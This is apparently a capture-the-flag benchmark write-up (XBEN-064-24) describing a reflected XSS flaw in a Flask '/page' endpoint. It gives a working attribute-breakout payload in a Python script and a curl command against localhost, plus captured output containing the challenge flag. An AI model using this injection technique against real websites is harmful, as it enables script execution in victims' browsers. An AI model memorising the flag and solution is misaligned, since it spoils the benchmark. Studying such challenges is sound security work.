# XBEN-064-24 — Cross 9

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Reflected Cross-Site Scripting (XSS) via unsanitized attribute injection

## Summary

The `/page` endpoint (Flask, `src/app.py`) reflects the `solution` POST parameter directly
into an HTML `value="..."` attribute with no escaping:

```python
value =  "" if msg == "" else 'value="{0}"'.format(msg)
...
data = XSS_CONTENT_POST.format("9", "Circle", value, "", "")
```

Because `msg` is inserted raw between the double quotes, a payload starting with `"` breaks
out of the `value` attribute and lets us add new HTML attributes on the `<input>` tag. The
backend then renders the resulting page and drives it headlessly with PhantomJS
(`check.js`), which dispatches a synthetic `focus` event to any element with an
`autofocus`/`onfocus` attribute and reports whatever string is passed to `window.alert()`.
Injecting `onfocus=alert('XSS')` plus `autofocus` therefore fires our JavaScript and wins
the challenge (the server checks that the alert message is exactly the string `XSS`).

## Exploit

The payload must be sent **urlencoded** (not multipart) so the raw `"` survives correctly
into the attribute; using `curl -F` mangled quoting in testing, so a small Python script
using `application/x-www-form-urlencoded` was used instead:

```python
import urllib.request, urllib.parse

PORT = 62170  # replace with the port from `docker compose port web 5000`
payload = '" autofocus onfocus=alert(\'XSS\') x="'
body = urllib.parse.urlencode({'solution': payload}).encode()
req = urllib.request.Request(
    f"http://localhost:{PORT}/page",
    data=body,
    method="POST",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
)
print(urllib.request.urlopen(req).read().decode())
```

Equivalent one-liner with curl (urlencoded body, not `-F`):

```bash
curl -s -X POST \
  --data-urlencode "solution=\" autofocus onfocus=alert('XSS') x=\"" \
  http://localhost:62170/page
```

### Captured output

```html
<div class="solution-text"><img src="static/img/cookies/success_circle.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: FLAG{fa63829a3da42cd10741d2b998d7dc5d0ef68ebc49bca71f4d6d8610197e4e3a}</div>
<input type=text name=solution placeholder="Enter solution..." value="" autofocus onfocus=alert('XSS') x="">
```

The injected HTML in the rendered page became:

```html
<input type=text name=solution placeholder="Enter solution..." value=""
       autofocus onfocus=alert('XSS') x="">
```

`autofocus`/`onfocus` triggers PhantomJS's synthetic focus dispatch, `alert('XSS')` fires,
`check.js` captures the string `"XSS"`, and the server compares it against the expected
value, returning the flag.
